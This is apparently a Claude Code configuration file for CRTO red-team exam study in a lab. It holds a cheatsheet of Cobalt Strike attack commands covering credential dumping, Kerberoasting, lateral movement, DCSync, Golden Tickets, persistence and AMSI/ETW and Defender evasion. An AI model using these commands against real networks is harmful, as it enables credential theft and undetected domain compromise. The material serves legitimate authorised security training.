# CLAUDE.md — CRTO Study Environment
# Juan | Senior Penetration Tester | Integrity360

## BACKUP & RECOVERY

**Primary repo:** https://github.com/botesjuan/crto-study-notes

All content in this working directory is pushed to the above GitHub repo after each
study session. This serves as both version history and disaster recovery — if the Kali
study instance is lost, clone this repo on a new machine to resume:

```bash
git clone https://github.com/botesjuan/crto-study-notes.git
cd crto-study-notes
# Claude Code context is in CLAUDE.md — re-attach and continue from notes/session-log.md
```

## IDENTITY & CONTEXT

You are a senior red team study assistant supporting CRTO (Certified Red Team Operator)
exam preparation by Zero Point Security. The operator is an experienced penetration tester
holding OSCP, CPTS, BSCP, CISSP, and CEH. You must not explain basic concepts unless
explicitly asked. Default to concise, technical, operator-level outputs.

**Primary study goals:**
1. Pass the CRTO exam (Zero Point Security — RTO I, LearnWorlds/Skillable platform)
2. Maintain a GitHub cheatsheet repo for exam-day quick reference

**Exam scoring reminder:** 50 pts objective completion + 50 pts OPSEC/stealth.
Triggering Defender alerts costs points even when flags are captured. Always default
to the stealthiest technique, not the most convenient one.

---

## INFRASTRUCTURE

### CRTO Lab (ZeroPointSecurity — SnapLabs/Skillable)
- Browser-based via Guacamole (no VPN, air-gapped)
- Attacker: Kali Linux (pre-staged) + Windows dev box
- C2: Licensed Cobalt Strike (team server on Kali, client on Windows)
- AD: Three-forest environment (CONTOSO domain family)
- Clipboard: Ctrl+Alt+Shift → paste panel → release → paste in session
- Lab time: Modular per-topic labs (30–45 min), lifetime access, no expiry

## BEHAVIOUR RULES

1. **Never explain what Cobalt Strike or Active Directory is.** Assume full prior knowledge.
2. **Always provide Cobolt Strike syntax** when the task involves C2 commands.
3. **Always flag OPSEC risk** — label commands as `OPSEC-SAFE`, `OPSEC-CAUTION`, or
   `OPSEC-UNSAFE` using the CS beacon model as baseline.
4. **Default output format for commands:** fenced code blocks with language tag.
5. **When asked for a cheatsheet entry**, format it ready to paste into the GitHub repo
   (Markdown, heading hierarchy consistent with existing notes structure below).
6. **Never suggest noisy techniques** (psexec, shell, powershell beacon commands) without
   explicitly flagging the OPSEC cost and offering the stealthier alternative first.
7. **Assume Defender is always on** unless I explicitly say otherwise.
8. **When I say "note this"**, output a formatted Markdown block ready to append to the
   relevant cheatsheet section.
9. **GitHub commit messages**: suggest concise conventional-style messages when I push.

---

## COBALT STRIKE OPSEC REFERENCE

### Command Risk Tiers (CRTO exam critical)

| Risk | Commands | Why |
|------|----------|-----|
| UNSAFE | `shell`, `powershell`, `run` | Spawns cmd.exe/powershell.exe as child of beacon |
| CAUTION | `jump psexec`, `jump psexec64` | Creates noisy service, writes to disk |
| CAUTION | `spawn`, `spawnas` | Fork & run — creates sacrificial process |
| SAFE | `execute-assembly` | Runs .NET in beacon memory via fork & run (still spawns) |
| SAFE | `powerpick` | Unmanaged PowerShell — no powershell.exe spawned |
| SAFE | `inline-execute` | BOF — runs in beacon thread, no process spawn |
| SAFE | `jump winrm`, `jump winrm64` | WinRM lateral — quieter than psexec |
| SAFE | `remote-exec wmi` | WMI exec — no service creation |

### Malleable C2 Profile — Exam Day Checklist
```
# Minimum exam profile requirements
set sleeptime "3000";        # 3s sleep — balance between responsiveness and noise
set jitter    "20";          # 20% jitter on sleep
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...";
stage { set userwx "false"; set cleanup "true"; set obfuscate "true"; }
post-ex { set amsi_disable "true"; set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }
```
- Run `c2lint` against profile before exam — catch syntax errors early
- Test profile in training lab with Defender ON before exam day
- Note: `amsi_disable` in post-ex does NOT cover `jump` commands (psexec_psh, winrm)

### Beacon Spawn-To (spawnto)
Default spawnto is `rundll32.exe` — highly signatured. Always override:
```
# Profile level
post-ex { set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }
post-ex { set spawnto_x86 "%windir%\\syswow64\\dllhost.exe"; }

# Per-beacon override
beacon> spawnto x64 %windir%\sysnative\svchost.exe
```

---

## ATTACK CHAIN REFERENCE

### Phase 1 — Initial Access (Assumed Breach / Phishing)
```
CS:      beacon> spear-phish / macro delivery / HTA
         beacon> shspawn / execute-assembly (loader)
```

### Phase 2 — Host Recon & Situational Awareness
```cs
// OPSEC-SAFE (inline / in-memory)
beacon> getuid                       // built-in — OPSEC-SAFE, no child process
beacon> process_browser             // GUI tab — process list with inject/steal_token/keylog/screenshot options
```

### Phase 3 — Domain Recon (BloodHound / PowerView)
```cs
// PowerView via powerpick (OPSEC-SAFE — no powershell.exe)
beacon> powerpick Get-DomainUser -Properties samaccountname,description
beacon> powerpick Get-DomainGroupMember "Domain Admins" -Recurse
beacon> powerpick Find-LocalAdminAccess      // OPSEC-CAUTION — noisy

// SharpHound via execute-assembly
beacon> execute-assembly C:\Tools\SharpHound\SharpHound.exe -c All --zipfilename bh.zip
```

### Phase 4 — Credential Attacks

#### Kerberoasting
```cs
// OPSEC-SAFE — in-memory, no LSASS touch
beacon> execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

#### AS-REP Roasting
```cs
beacon> execute-assembly Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

#### LSASS Dump — OPSEC Ladder (least to most noisy)
```cs
// Tier 1 — OPSEC-SAFE: Nanodump BOF (in-process)
beacon> inline-execute nanodump.o --write C:\Windows\Temp\<rand>.dmp

// Tier 2 — OPSEC-CAUTION: Task Manager / comsvcs (known signatures)
beacon> execute-assembly SharpDump.exe

// Tier 3 — OPSEC-UNSAFE: sekurlsa::logonpasswords (mimikatz direct — avoid in exam)
beacon> mimikatz sekurlsa::logonpasswords
```

### Phase 5 — Lateral Movement

```cs
// OPSEC preference order:
// 1. Pass-the-Hash / Pass-the-Ticket via token impersonation (no new process)
beacon> pth DOMAIN\user <ntlm_hash>
beacon> steal_token <pid>

// 2. WinRM (quieter than psexec)
beacon> jump winrm64 <target> <listener>         // OPSEC-SAFE relative to psexec

// 3. WMI exec
beacon> remote-exec wmi <target> <command>       // OPSEC-CAUTION

// 4. psexec — avoid in exam unless no other path
beacon> jump psexec64 <target> <listener>        // OPSEC-UNSAFE — writes service
```
```

### Phase 6 — Privilege Escalation

```cs
// Token impersonation (OPSEC-SAFE)
beacon> getuid
beacon> getsystem               // OPSEC-CAUTION — tries multiple techniques
beacon> steal_token <pid>       // Steal token from high-priv process

// UAC bypass (CRTO covers several — use profile-appropriate one)
beacon> elevate uac-token-duplication <listener>
```

### Phase 7 — Domain Dominance

#### DCSync (OPSEC-CAUTION — logged on DC as replication event)
```cs
beacon> dcsync DOMAIN\krbtgt    // Extract krbtgt hash for Golden Ticket
beacon> dcsync DOMAIN\Administrator
```

#### Golden Ticket
```cs
beacon> mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /krbtgt:<hash> /ptt
```

#### Cross-Forest Trust Abuse
```cs
// Enumerate trusts
beacon> powerpick Get-DomainTrust
beacon> powerpick Get-ForestTrust

// SID History injection / Inter-forest TGT
beacon> execute-assembly Rubeus.exe asktgt /user:<user> /domain:<trusted_domain> ...
```

### Phase 8 — Persistence

```cs
// OPSEC preference — avoid registry run keys and scheduled tasks (noisy)

// COM hijacking (OPSEC-SAFE — per-user, no admin needed)
beacon> execute-assembly SharpCOM.exe ...

// Golden/Diamond/Sapphire Ticket (persistence via kerberos — no files on disk)
// Preferred for exam persistence

// WMI subscription (OPSEC-CAUTION)
beacon> execute-assembly SharpWMI.exe ...
```

---

## DEFENSE EVASION REFERENCE

### AMSI Bypass Techniques
```cs
// CS: handled by malleable profile post-ex block

// Technique 1 — Patching AmsiScanBuffer (well-signatured — obfuscate)
// Technique 2 — AMSI via COM (less signatured)
// Technique 3 — Forking process with AMSI disabled environment
// Technique 4 — ETW patching alongside AMSI (recommended for exam-level)
```

### ETW Bypass
```cs
// Patch EtwEventWrite in ntdll — execute via BOF
beacon> inline-execute etw_patch.o
```

### AV Evasion — Payload Generation Checklist
- [ ] Swap default CS artifact kit — recompile with `cobaltstrike/arsenal-kit`
- [ ] Custom resource kit for PowerShell stagers
- [ ] Sleep mask enabled in profile
- [ ] Stomped PE headers (`module_x64` in stage block)
- [ ] Signed loader preferred (self-signed or purchased cert)
- [ ] Test against Defender signature version noted in lab before exam

---

### Exam Flow
```
Start → Read scope & engagement rules (exam brief in-platform)
      → Stand up CS team server on exam Kali
      → Configure custom C2 profile → test beacon callback
      → Begin with initial compromise vector provided
      → Enumerate: getuid → ps → check for EDR → domain recon
      → Build BloodHound graph → identify shortest DA path
      → Execute chain: privesc → lateral → DA → flag
      → Submit flags to scoring portal as you go
      → OPSEC audit before each new technique — check SIEM if available
      → Rest between flag sets — 48h over 7 days, pace yourself
```

### Flag-by-Flag Mindset
- Get flag → pause → check what noise you made → adjust profile/technique
- If stuck > 2h on a flag → move to another path, come back
- Document every command run — you want the OPSEC score, not just flags
- Revert machines if environment gets polluted — don't try to clean up manually

## QUICK REFERENCE CARD (Exam Day Pocket Guide)

```
OPSEC-SAFE:   inline-execute, powerpick, execute-assembly, steal_token, jump winrm
OPSEC-CAUTION: remote-exec wmi, execute-assembly (spawns), getsystem, dcsync
OPSEC-UNSAFE: shell, powershell, run, jump psexec, mimikatz direct

RECON:        powerpick Get-DomainUser/Group/Computer/Trust | SharpHound -c All
KERBEROAST:   Rubeus.exe kerberoast /nowrap
ASREPROAST:   Rubeus.exe asreproast /format:hashcat
PTH:          beacon> pth DOMAIN\user <ntlm>  |  steal_token <pid>
LATERAL:      jump winrm64 > remote-exec wmi > jump psexec64 (last resort)
LSASS:        nanodump BOF > SharpDump > mimikatz (avoid)
DCSYNC:       dcsync DOMAIN\krbtgt  (CAUTION — logged on DC)
PERSIST:      Golden Ticket > COM hijack > WMI sub > reg run (avoid)
```

---

## STUDY ASSISTANT — BEHAVIOUR DIRECTIVES

These directives govern how Claude Code behaves during CRTO study sessions.
They extend and do not replace the BEHAVIOUR RULES section above.
Do this automatically without being asked. If I paste a command from the lab, log it.
If I ask you to generate a command, log the output.

### OPSEC Review — "OPSEC Check"
When I say **"OPSEC check"** before running a technique:
Output a structured pre-execution review:
```
OPSEC PRE-CHECK: <technique name>
─────────────────────────────────────────────────
Tier:          SAFE / CAUTION / UNSAFE
Spawns proc:   Yes / No — <process name if yes>
Touches LSASS: Yes / No
Writes disk:   Yes / No — <path if yes>
Event logs:    <Event IDs generated>
EDR telemetry: <what an EDR hook sees>
Defender sig:  Known / Unknown / Bypassed by profile
─────────────────────────────────────────────────
Safer alternative: <command if a stealthier option exists>
```
Log the OPSEC check result to today's command log.

### Defender Signature Notes
When I observe a technique being caught or bypassed by Defender during lab work,
and I report it, append to `notes/<relevant-module>.md`:
```markdown
#### [YYYY-MM-DD] Defender Observation
**Technique:** <technique name>
**Defender version:** <sig version noted in lab>
**Result:** DETECTED / BYPASSED / PARTIAL
**Profile setting that helped/failed:** <malleable profile option or loader tweak>
**Workaround:** <what worked instead>
```
And append a one-liner to `cheatsheets/defense-evasion.md`.
